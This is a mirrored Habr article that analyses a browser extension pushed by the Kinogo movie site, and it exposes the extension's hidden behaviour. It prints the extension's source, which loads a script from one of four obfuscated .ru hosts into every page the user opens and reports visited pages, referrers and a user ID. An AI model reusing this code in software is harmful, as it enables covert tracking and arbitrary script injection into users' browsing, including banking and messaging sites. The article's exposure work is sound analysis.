<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Browser extension from Kinogo site</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Continuing the theme of the review extensions, consider the following. 
 When entering the Kinogo website, a banner began to emerge: 



 I wondered w...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Browser extension from Kinogo site</h1><div class="post__text post__text-html js-mediator-article">  Continuing the theme of the review extensions, consider the following. <br>  When entering the Kinogo website, a banner began to emerge: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/41d/724/125/41d724125f034c0eb90838c8ed3a1d97.png"></div><br><br>  I wondered what kind of extension it was and decided to look at the code. <br><a name="habracut"></a><br><h2>  Why did the extension appear? </h2><br>  Information from the creators (screenshot of the group vk, below will be duplicated by the text, do not spoil the vision): 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <div style="text-align:center;"><img src="https://habrastorage.org/files/b92/ac7/e24/b92ac7e249d840c1b5d6c378001e6b6a.png"></div><br><br><div class="spoiler">  <b class="spoiler_title">Screenshot Text</b> <div class="spoiler_text">  Hello!  Recently, we launched an alert for visitors on kinogo.co regarding the installation of our plug-ins (under Mozilla Firefox, Google Chrome, Yandex Browser, etc.) aimed at bypassing the possible blocking of our project by providers of the Russian Federation and countries bordering the Russian Federation.  We confirm all our plugins, and we actively support them. <br><br>  The only plugin that is not yet ready for us under the Opera browser, expect in the near future.  Internet Explorer support will not be available. <br><br>  The alert flies out once a day on the site, if today for any reason you have not installed the extension, you will be able to install or refuse tomorrow, by closing the window. <br></div></div><br><h2>  About expansion </h2><br>  It is worth noting that there are several extensions (not less than 3).  Different users may have different links to extensions.  Those extensions that I came across contained identical code.  Therefore, I will stop <a href="https://chrome.google.com/webstore/detail/angry-racoon-%25D1%2583%25D1%2585%25D0%25BE%25D0%25B4-%25D0%25BE%25D1%2582-%25D0%25B1%25D0%25B0%25D0%25BD%25D0%25B0/hdipdmgfoponabkeiacehfflkboljlce">there</a> . <br><br>  Name: Angry Racoon - Ban Care <br>  Last updated: May 5, 2015. <br>  Version: 1.0.3 <br><br><h2>  Expansion Code Overview </h2><br>  I will briefly describe only an interesting chain: <br><br>  1. Parsing any extension begins with manifest.json <br><br><div class="spoiler">  <b class="spoiler_title">manifest.json</b> <div class="spoiler_text"><pre><code class="hljs json">{ <span class="hljs-attr"><span class="hljs-attr">"background"</span></span>: { <span class="hljs-attr"><span class="hljs-attr">"page"</span></span>: <span class="hljs-string"><span class="hljs-string">"html/background.html"</span></span> }, <span class="hljs-attr"><span class="hljs-attr">"content_scripts"</span></span>: [ { <span class="hljs-attr"><span class="hljs-attr">"js"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"core/frameworks/cajon.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"core/frameworks/jquery.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"core/process.js"</span></span> ], <span class="hljs-attr"><span class="hljs-attr">"matches"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"*://*/*"</span></span> ], <span class="hljs-attr"><span class="hljs-attr">"run_at"</span></span>: <span class="hljs-string"><span class="hljs-string">"document_start"</span></span> } ], <span class="hljs-attr"><span class="hljs-attr">"description"</span></span>: <span class="hljs-string"><span class="hljs-string">"           !"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"icons"</span></span>: { <span class="hljs-attr"><span class="hljs-attr">"128"</span></span>: <span class="hljs-string"><span class="hljs-string">"images/128.png"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"16"</span></span>: <span class="hljs-string"><span class="hljs-string">"images/16.png"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"48"</span></span>: <span class="hljs-string"><span class="hljs-string">"images/48.png"</span></span> }, <span class="hljs-attr"><span class="hljs-attr">"manifest_version"</span></span>: <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-attr"><span class="hljs-attr">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"Angry Kino -   "</span></span>, <span class="hljs-attr"><span class="hljs-attr">"permissions"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"webRequest"</span></span>, <span class="hljs-string"><span class="hljs-string">"webRequestBlocking"</span></span>, <span class="hljs-string"><span class="hljs-string">"webNavigation"</span></span>, <span class="hljs-string"><span class="hljs-string">"tabs"</span></span>, <span class="hljs-string"><span class="hljs-string">"\u003Call_urls&gt;"</span></span> ], <span class="hljs-attr"><span class="hljs-attr">"update_url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://clients2.google.com/service/update2/crx"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"version"</span></span>: <span class="hljs-string"><span class="hljs-string">"1.0.3"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"web_accessible_resources"</span></span>: [ <span class="hljs-string"><span class="hljs-string">"images/_.png"</span></span>, <span class="hljs-string"><span class="hljs-string">"core/content.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"core/contentSession.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"core/messaging.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"core/frameworks/uri.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"core/backgroundHandlers.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"core/backgroundSession.js"</span></span>, <span class="hljs-string"><span class="hljs-string">"core/backgroundUtils.js"</span></span> ] }</code> </pre> <br></div></div><br>  2. From the value of the ‚Äúcontent_scripts‚Äù key, it follows that, in addition to frameworks, the process.js file is connected to EVERY page opened by the user <br><br><div class="spoiler">  <b class="spoiler_title">process.js</b> <div class="spoiler_text"><pre> <code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">require</span></span>.config({ <span class="hljs-attr"><span class="hljs-attr">baseUrl</span></span>: chrome.extension.getURL(<span class="hljs-string"><span class="hljs-string">'/'</span></span>) }); <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>([ <span class="hljs-string"><span class="hljs-string">"core/content"</span></span> ], <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ });</code> </pre><br></div></div><br>  3. In process.js, using the require function, the file ‚Äúcontent.js‚Äù is connected. <br><br><div class="spoiler">  <b class="spoiler_title">content.js</b> <div class="spoiler_text"><pre> <code class="javascript hljs">define(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">require</span></span></span><span class="hljs-function">) </span></span>{ exports = {}; (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> messageDispatcher = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">'core/messaging'</span></span>).MessageDispatcher; messageDispatcher.sendToBackground( { <span class="hljs-attr"><span class="hljs-attr">cmd</span></span>: <span class="hljs-string"><span class="hljs-string">'GetRequestUrl'</span></span> }, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">url</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (url) { url = url.replace(<span class="hljs-regexp"><span class="hljs-regexp">/^https?:/</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>) + <span class="hljs-string"><span class="hljs-string">'&amp;r='</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">encodeURIComponent</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.referrer) + <span class="hljs-string"><span class="hljs-string">'&amp;h='</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">encodeURIComponent</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location.host) + <span class="hljs-string"><span class="hljs-string">'&amp;rand='</span></span> + (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>()).getTime(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.head) { $(<span class="hljs-string"><span class="hljs-string">"head"</span></span>).append($(<span class="hljs-string"><span class="hljs-string">"&lt;script /&gt;"</span></span>, { <span class="hljs-attr"><span class="hljs-attr">src</span></span>: url })); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.head) { clearInterval(i); $(<span class="hljs-string"><span class="hljs-string">"head"</span></span>).append($(<span class="hljs-string"><span class="hljs-string">"&lt;script /&gt;"</span></span>, { <span class="hljs-attr"><span class="hljs-attr">src</span></span>: url })); } }, <span class="hljs-number"><span class="hljs-number">100</span></span>); } } }); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-regexp"><span class="hljs-regexp">/^(.*\.)?kinogo\.(\w+)$/i</span></span>.test(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location.host)) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i2 = setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.body) { clearInterval(i2); $(<span class="hljs-string"><span class="hljs-string">"body"</span></span>).append($(<span class="hljs-string"><span class="hljs-string">"&lt;div&gt;"</span></span>).addClass(<span class="hljs-string"><span class="hljs-string">'KINOEXTESIONWASINSTALLED'</span></span>).hide()); } }, <span class="hljs-number"><span class="hljs-number">100</span></span>); } }).call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> exports; });</code> </pre><br></div></div><br>  4. In content.js, an interesting function call is the messageDispatcher.sendToBackground from the messaging.js file. <br><br><div class="spoiler">  <b class="spoiler_title">messaging.js</b> <div class="spoiler_text"><pre> <code class="javascript hljs">define(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">require</span></span></span><span class="hljs-function">) </span></span>{ exports = {}; (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _handlers = {}; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dispatcher</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">handlers, request, sender, sendResponse</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!request || !request.cmd || !(<span class="hljs-keyword"><span class="hljs-keyword">typeof</span></span> request.cmd === <span class="hljs-string"><span class="hljs-string">'string'</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">throw</span></span> <span class="hljs-string"><span class="hljs-string">'Error: Bad request!'</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> handlerName = <span class="hljs-string"><span class="hljs-string">'handle'</span></span> + request.cmd; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> handler = handlers[handlerName]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!(<span class="hljs-keyword"><span class="hljs-keyword">typeof</span></span> handler === <span class="hljs-string"><span class="hljs-string">'function'</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } handler(request.args, sender, sendResponse); } chrome.extension.onMessage.addListener( <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">request, sender, sendResponse</span></span></span><span class="hljs-function">) </span></span>{ dispatcher(_handlers, request, sender, sendResponse); } ); exports.MessageDispatcher = { <span class="hljs-attr"><span class="hljs-attr">addHandlers</span></span>: <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">handlers</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> name <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> handlers) { _handlers[name] = handlers[name]; } }, <span class="hljs-attr"><span class="hljs-attr">sendToBackground</span></span>: <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">request, callback</span></span></span><span class="hljs-function">) </span></span>{ callback = callback || $.noop; chrome.extension.sendMessage(request, callback); }, <span class="hljs-attr"><span class="hljs-attr">sendToContentScript</span></span>: <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">tabId, request, callback</span></span></span><span class="hljs-function">) </span></span>{ callback = callback || $.noop; chrome.tabs.sendMessage(tabId, request, callback); } }; }).call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> exports; });</code> </pre><br></div></div><br>  5. This function is a wrapper over the Extensions API for easy messaging between the background script and the scripts inserted on each page. <br><br>  6. So, the messageDispatcher.sendToBackground function requests the url from the background script. <br><br>  7. The search for getting the file with the code for sending the url is similar to the items above, so just a chain: <br><br><pre> manifest.json == (key "background.page") ==&gt; background.html
 backround.html == (script) ==&gt; demon.js
 demon.js == (require) ==&gt; backround.js
 background.js == (require) ==&gt; backgroundHandlers.js
 backgroundHandlers.js == (require) ==&gt; backgroundUtils.js
</pre><br><br>  8. Consider backgroundUtils.js <br><br><div class="spoiler">  <b class="spoiler_title">backgroundUtils.js</b> <div class="spoiler_text"><pre> <code class="javascript hljs">define(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">require</span></span></span><span class="hljs-function">) </span></span>{ exports = {}; (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> Session = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">'core/backgroundSession'</span></span>).Session; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ProxyGetter = <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">'core/proxy'</span></span>).ProxyGetter; exports = { <span class="hljs-attr"><span class="hljs-attr">getRequestUrl</span></span>: <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ProxyGetter.serverIp) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> ( ProxyGetter.serverIp + <span class="hljs-string"><span class="hljs-string">'/getscripts2?'</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getRequestParams() ); } }, <span class="hljs-attr"><span class="hljs-attr">getRequestParams</span></span>: <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (<span class="hljs-string"><span class="hljs-string">'&amp;b='</span></span> + Session.buildId + <span class="hljs-string"><span class="hljs-string">'&amp;uid='</span></span> + Session.instanceId + <span class="hljs-string"><span class="hljs-string">'&amp;insd='</span></span> + Session.installDate + <span class="hljs-string"><span class="hljs-string">'&amp;sid='</span></span> + <span class="hljs-string"><span class="hljs-string">'&amp;df='</span></span> ); }, <span class="hljs-attr"><span class="hljs-attr">sendNotify</span></span>: <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">from, to</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ProxyGetter.serverIp) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = ( ProxyGetter.serverIp + <span class="hljs-string"><span class="hljs-string">'/kinogo_log?'</span></span> + <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getRequestParams() + <span class="hljs-string"><span class="hljs-string">'&amp;from='</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">encodeURIComponent</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">from</span></span>) + <span class="hljs-string"><span class="hljs-string">'&amp;to='</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">encodeURIComponent</span></span>(to) ); $.get(url); } } }; }).call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> exports; });</code> </pre><br></div></div><br>  9. Using the getRequestUrl function and the file with the addresses proxy.js, the extension receives one of the 4 urls (randomly). <br><br><pre> 'http://outrageous.ru',
 'http://thrilling.ru',
 'http://frightened.ru',
 'http://agitated.ru',
</pre><br><div class="spoiler">  <b class="spoiler_title">proxy.js</b> <div class="spoiler_text"><pre> <code class="javascript hljs">define(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">require</span></span></span><span class="hljs-function">) </span></span>{ exports = {}; (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-comment"><span class="hljs-comment">/** * Bypass protection from Roskomnadzor */</span></span> <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> reserveLinks = [ <span class="hljs-string"><span class="hljs-string">'ht'</span></span> + <span class="hljs-string"><span class="hljs-string">'tp'</span></span> + <span class="hljs-string"><span class="hljs-string">':/'</span></span> + <span class="hljs-string"><span class="hljs-string">'/outr'</span></span> + <span class="hljs-string"><span class="hljs-string">'ageous'</span></span> + <span class="hljs-string"><span class="hljs-string">'.ru'</span></span>, <span class="hljs-string"><span class="hljs-string">'ht'</span></span> + <span class="hljs-string"><span class="hljs-string">'tp'</span></span> + <span class="hljs-string"><span class="hljs-string">':/'</span></span> + <span class="hljs-string"><span class="hljs-string">'/thri'</span></span> + <span class="hljs-string"><span class="hljs-string">'lling'</span></span> + <span class="hljs-string"><span class="hljs-string">'.ru'</span></span>, <span class="hljs-string"><span class="hljs-string">'ht'</span></span> + <span class="hljs-string"><span class="hljs-string">'tp'</span></span> + <span class="hljs-string"><span class="hljs-string">':/'</span></span> + <span class="hljs-string"><span class="hljs-string">'/frig'</span></span> + <span class="hljs-string"><span class="hljs-string">'htened'</span></span> + <span class="hljs-string"><span class="hljs-string">'.ru'</span></span>, <span class="hljs-string"><span class="hljs-string">'ht'</span></span> + <span class="hljs-string"><span class="hljs-string">'tp'</span></span> + <span class="hljs-string"><span class="hljs-string">':/'</span></span> + <span class="hljs-string"><span class="hljs-string">'/agit'</span></span> + <span class="hljs-string"><span class="hljs-string">'ated'</span></span> + <span class="hljs-string"><span class="hljs-string">'.ru'</span></span>, ]; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ProxyGetter = {}; ProxyGetter.serverIp = <span class="hljs-literal"><span class="hljs-literal">null</span></span>; <span class="hljs-comment"><span class="hljs-comment">/** * Use proxy * @param {type} callback * @returns {undefined} */</span></span> ProxyGetter.findServer = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">callback</span></span></span><span class="hljs-function">) </span></span>{ ProxyGetter.serverIp = <span class="hljs-literal"><span class="hljs-literal">null</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(reserveLinks.length &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { ProxyGetter.serverIp = reserveLinks[<span class="hljs-built_in"><span class="hljs-built_in">parseInt</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.random() * reserveLinks.length)]; } callback(); }; exports.ProxyGetter = ProxyGetter; }).call(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> exports; });</code> </pre><br></div></div><br>  10. So, on the client script request, the background returns one of the 4 urls.  Let's return to the client script and the sendToBackground function (clause 6).  And this function adds to the url of the referrer for the page and inserts the script on the page according to the received url. <br><br>  The most interesting thing after reading the code is to confirm the findings in practice: <br><br><div style="text-align:center;"><img src="//habrastorage.org/files/256/da0/b83/256da0b8361b4ff5968ea853e26eada7.png"></div><br><br>  And now let's put everything together: <br><br>  1. Quite a popular site asks to install the extension. <br>  2. The extension inserts an arbitrary script on each user page that can do anything (I will mention the phrases from the <a href="http://habrahabr.ru/post/255801/">previous article</a> - online banking, passwords, messages, anonymity). <br>  3. In addition to the script, there is an explicit sending of information about the user: visited pages and referrers for these pages. <br><br>  Draw your own conclusions. <br><br>  PS Previously, the article contained the phrase "Continuing the theme of malicious extensions, consider the following.".  She was deliberately removed.  Once again I draw attention to the fact that the purpose of the article is to show what functions and capabilities the code of this extension has in addition to the stated ones. </div><p>Source: <a href="https://habr.com/ru/post/257361/">https://habr.com/ru/post/257361/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../257343/index.html">Microsoft refuses to Patch Tuesday for Windows 10</a></li>
<li><a href="../257345/index.html">The principle of heart rate variability analysis in MATLAB</a></li>
<li><a href="../257347/index.html">SLA: build bridges, not walls</a></li>
<li><a href="../257349/index.html">Alternative HLS for iOS Safari - streaming video through Websocket</a></li>
<li><a href="../257355/index.html">ES6 and beyond. Chapter 1: ES? Present and Future</a></li>
<li><a href="../257363/index.html">Java App Bundlers Review</a></li>
<li><a href="../257371/index.html">How was the JPoint 2015: a full house and interesting details</a></li>
<li><a href="../257375/index.html">‚ÄúLaundry, why are you calling me?‚Äù - we released a new 2GIS Dialer</a></li>
<li><a href="../257377/index.html">How 3CX Phone System Solves Security Issues in VoIP (Part 1)</a></li>
<li><a href="../257379/index.html">Promoting your indie game: the most important nuances that nobody knows about</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>